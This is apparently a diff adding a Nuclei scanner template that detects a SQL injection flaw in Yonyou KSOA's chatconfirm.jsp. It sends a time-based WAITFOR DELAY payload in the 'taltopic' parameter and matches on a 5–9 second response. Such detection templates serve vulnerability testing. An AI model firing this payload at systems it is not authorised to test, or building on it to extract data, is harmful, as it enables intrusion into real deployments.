@@ -1,0 +1,34 @@
+id: yonyou-ksoa-chatconfirm-sqli
+info:
+  name: 用友-时空KSOA chatconfirm 存在SQL注入
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/60891/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    sqlmap:
+    version:
+  tags: sqli,yonyou,ksoa
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        GET /luntan/chatconfirm.jsp?taltopic=%27%3bWAITFOR+DELAY+%270%3a0%3a5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+
+    matchers:
+      - type: dsl
+        dsl:
+          # - contains_all(body,'')
+          # - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
